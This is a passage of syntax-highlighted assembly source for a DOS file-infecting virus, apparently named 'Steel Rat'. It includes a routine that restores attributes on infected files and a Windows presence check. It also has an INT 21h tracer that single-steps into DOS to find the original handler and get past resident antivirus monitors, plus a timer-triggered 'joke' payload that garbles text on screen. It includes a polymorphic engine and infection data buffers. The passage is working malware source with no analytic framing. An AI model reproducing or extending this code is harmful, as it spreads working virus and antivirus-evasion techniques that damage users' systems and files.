</span><span class="sc5">savea</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">resta</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dss</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Restore attributes</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dxs</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
</span><span class="sc9">if</span><span class="sc0">  </span><span class="sc5">TestVir</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">resta</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Freedom is the greatest thing in the world !'</span><span class="sc0">

</span><span class="sc5">CheckWin</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1600h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">WinHere</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">WinHere</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CWin</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">WinHere</span><span class="sc0">
</span><span class="sc5">CWin</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4680h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoWin</span><span class="sc0">
</span><span class="sc5">WinHere</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Windoze</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">NoWin</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckWin</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;------------------- i21 Tracer -------------------------------</span><span class="sc0">

</span><span class="sc5">tunnelit</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">            </span><span class="sc1">; Int 21 tunneler</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">

    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tunend</span><span class="sc0">            </span><span class="sc1">; Store offset for return</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3501h</span><span class="sc0">                </span><span class="sc1">; Get int 1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">o1</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">         </span><span class="sc1">; Store it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">o1</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2501h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">proggy</span><span class="sc0">            </span><span class="sc1">; Set it</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    
    </span><span class="sc6">cli</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">              </span><span class="sc1">; Set trace flag</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">

    </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i21</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Get current int 21</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2501h</span><span class="sc0">                </span><span class="sc1">; Restore old 1</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">o1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">                    </span><span class="sc1">; Go !</span><span class="sc0">

</span><span class="sc5">proggy</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0300h</span><span class="sc0">      </span><span class="sc1">; Reached MS-Dos segment ?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Save</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0C800h</span><span class="sc0">     </span><span class="sc1">; Reached high-dos segment ?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Work</span><span class="sc0">
</span><span class="sc5">Save</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">r21</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">; Get offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">r21</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f1</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; Tunelled !</span><span class="sc0">
</span><span class="sc5">Stop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">0FEFFh</span><span class="sc0">     </span><span class="sc1">; Disable trace</span><span class="sc0">
</span><span class="sc5">CheckOp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Get returning offset</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">09Ch</span><span class="sc0">             </span><span class="sc1">; Last opcode was pushf ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CheckOpz</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">][</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0FEFFh</span><span class="sc0">     </span><span class="sc1">; Drop trace flag</span><span class="sc0">
</span><span class="sc5">CheckOpz</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">CheckForPopf</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Dh</span><span class="sc0">              </span><span class="sc1">; Popf ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ItsPopf</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0CFh</span><span class="sc0">             </span><span class="sc1">; Iret ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ItsIret</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc0">              </span><span class="sc1">; Cs ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CheckForPopf</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">              </span><span class="sc1">; Es ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CheckForPopf</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc0">              </span><span class="sc1">; SS ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CheckForPopf</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F2h</span><span class="sc0">             </span><span class="sc1">; Rep ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CheckForPopf</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F3h</span><span class="sc0">             </span><span class="sc1">; Repne ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CheckForPopf</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">              </span><span class="sc1">; Ds ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CheckForPopf</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OpOk</span><span class="sc0">                </span><span class="sc1">; Nothing serious</span><span class="sc0">
</span><span class="sc5">ItsIret</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">        </span><span class="sc1">; Set trace flag again</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OpOk</span><span class="sc0">
</span><span class="sc5">ItsPopf</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">     </span><span class="sc1">; Set trace flag... ;)</span><span class="sc0">
</span><span class="sc5">OpOk</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">Work</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">tunend</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">TunnelTry</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Increase number of try's</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">tunnelit</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">TunnelTry</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Joke</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">joker</span><span class="sc4">],</span><span class="sc5">TNUM</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Give_em_Joke</span><span class="sc0">
</span><span class="sc5">Time_out</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">if</span><span class="sc0">  </span><span class="sc5">i28U</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IntInf</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Give_em_Joke</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">cnt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">cnt</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Time_Out</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">cnt</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0B800h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2000</span><span class="sc0">
</span><span class="sc5">He_he</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'1'</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NotNum</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'9'</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">NotNum</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SkipChar</span><span class="sc0">
</span><span class="sc5">NotNum</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'|'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Check2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'/'</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SkipChar</span><span class="sc0">
</span><span class="sc5">Check2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'/'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Check3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'-'</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SkipChar</span><span class="sc0">
</span><span class="sc5">Check3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'-'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Check4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SkipChar</span><span class="sc0">
</span><span class="sc5">Check4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SkipChar</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'|'</span><span class="sc0">
</span><span class="sc5">SkipChar</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">He_He</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Time_Out</span><span class="sc0">
</span><span class="sc5">Joke</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Cnt</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Joker</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">smm.asm</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Vlen</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">steel_rat</span><span class="sc0">
</span><span class="sc5">SLen</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">steel_rat</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Flen</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">RSeed</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">i21</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Different data</span><span class="sc0">
</span><span class="sc5">r21</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">i8</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">old24</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">i2f</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">o1</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">ss_s</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sp_s</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">dss</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dxs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">fr</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">f1</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">allow</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">Include</span><span class="sc0"> </span><span class="sc5">smm.dat</span><span class="sc0">                 </span><span class="sc1">; Different SMM variables</span><span class="sc0">

</span><span class="sc5">temp</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1Ah</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Windoze</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">esize</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">temp2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Dta</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">21</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Fname</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

